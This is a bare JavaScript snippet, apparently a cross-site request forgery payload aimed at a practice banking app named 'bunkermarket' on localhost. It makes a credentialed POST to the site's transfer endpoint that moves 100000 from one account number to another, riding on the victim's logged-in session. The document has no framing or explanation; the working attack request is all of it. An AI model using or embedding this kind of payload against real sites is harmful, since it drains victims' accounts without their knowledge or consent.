fetch("http://localhost/bunkermarket/transfer", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "from_account=VT-7731-2277-0451&to_account=VT-1234-1234-1234&amount=100000"
})
